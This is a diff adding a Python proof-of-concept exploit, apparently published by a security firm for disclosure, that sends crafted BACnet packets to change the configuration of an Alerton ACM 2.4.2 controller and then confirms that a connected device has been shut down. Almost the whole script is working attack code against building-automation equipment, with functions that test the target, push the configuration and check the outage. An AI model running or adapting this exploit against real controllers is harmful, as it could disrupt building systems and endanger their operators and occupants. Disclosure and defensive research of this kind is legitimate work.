@@ -1,0 +1,137 @@
+#!/usr/bin/python3
+"""
+#### DO NOT USE IN PRODUCTION ####
+#### Use with care - This software will change the configuration of Alerton ACM ###
+
+License: GPLv3
+Author: SCADAfence Ltd
+Title: Alerton Unauthorized Configuration Change Script
+
+###Important Note###
+This script is effective only when running against an Alerton ACM with the specific configuration of the ACM used to
+generate the script and with the specific topological layout found in our lab (and detailed in the supporting
+documentation). For this script to work on a different ACM, the configuration data being sent as the attack payload and
+the IOC checks will need to be adapted accordingly.
+###
+
+Alerton ACM 2.4.2 Unauthorized Configuration Change
+- configuration of ACM  2.4.2 is changed after running script potentially causing connectivity issues (not limited to)
+- Usage: python3 --ip X.X.X.X --port 47808
+
+Dependencies:
+    - python3
+    - run script as root (or using sudo)
+
+Tested against Alerton ACM with firmware version 2.4.2 and Compass Software version 1.6.5
+This issue affects: Alerton ACM with firmware version 2.4.2 - Changes the configuration of the controller
+                    Alerton Compass 1.6.5 - Displays locally saved configuration, which differs from the configuration
+                                            found on the controller
+"""
+
+import argparse
+import socket
+import time
+from acm_configuration import CONFIG_FILE_PACKET_LIST 
+
+DEFAULT_PORT = 47808
+
+# packet that will give indication that 1011 (which is connected on COM0) is disconnected (who-is 1011 1011)
+WHO_IS_1101_PACKET = b"\x81\x0b\x00\x12\x01\x20\xff\xff\x00\xff\x10\x08\x0a\x03\xf3\x1a\x03\xf3"
+
+I_AM_1101_RESPONSE_PART = b"\xc4\x02\x00\x03\xf3"
+WHO_IS_1101_RESPONSE_PART = b"\x08\x0a\x03\xf3\x1a\x03\xf3"
+
+
+def argument_parser():
+    parser = argparse.ArgumentParser(
+        description='Alerton Configuration Change POC')
+    parser.add_argument('--ip',
+                        type=str,
+                        help='<X.X.X.X>',
+                        required=True)
+    parser.add_argument('-p', '--port',
+                        default=DEFAULT_PORT,
+                        type=int,
+                        help='BACnet Port used in Alerton ACM',
+                        required=False)
+    return parser.parse_args()
+
+
+def get_socket_object():
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(30)
+    sock.bind(('0.0.0.0', 47808))
+    return sock
+
+
+def is_target_up(target_ip, target_port, socket_obj):
+    retry_count = 0
+    response_received = False
+    while retry_count < 3 and not response_received:
+
+        start_time = time.time()
+        end_time = time.time()
+        socket_obj.sendto(WHO_IS_1101_PACKET, (target_ip, target_port))
+
+        while int(end_time) - int(start_time) < 30:
+            a = socket_obj.recv(1024)
+            if I_AM_1101_RESPONSE_PART in a:
+                response_received = True
+                break
+            end_time = time.time()
+
+        retry_count += 1
+
+        if not response_received and retry_count < 3:
+            print('~ No response from COM_0 - Retrying'.format(target_ip))
+
+    if retry_count == 3:
+        return False
+
+    return True
+
+
+def write_new_config_to_device(target_ip, target_port, socket_obj):
+
+    for record in range(0, len(CONFIG_FILE_PACKET_LIST)):
+        socket_obj.sendto(CONFIG_FILE_PACKET_LIST[record], (target_ip, target_port))
+        socket_obj.recv(1024)
+
+    # wait for effects of change to take place
+    time.sleep(10)
+
+
+def is_target_down(target_ip, socket_obj):
+    start_time = time.time()
+    end_time = time.time()
+    while int(end_time) - int(start_time) < 60:
+        a = socket_obj.recv(1024)
+        if a.endswith(WHO_IS_1101_RESPONSE_PART):
+            return True
+        end_time = time.time()
+
+    return False
+
+
+def main(args):
+    target_ip = args.ip
+    target_port = args.port
+
+    socket_obj = get_socket_object()
+    if is_target_up(target_ip, target_port, socket_obj):
+
+        print('~ Host {} COM_0 UP - starting attack'.format(target_ip))
+        write_new_config_to_device(target_ip, target_port, socket_obj)
+
+        if is_target_down(target_ip, socket_obj):
+            print('~ Host {} - COM_0 Shut Down Successfully'.format(target_ip))
+        else:
+            print('~ Host {} - COM_0 Shutdown Attempt Failed'.format(target_ip))
+    else:
+        print('~ COM_0 not responsive - Timeout Error. Shutting down script'.format(target_ip))
+
+
+if __name__ == "__main__":
+    _args = argument_parser()
+    main(_args)
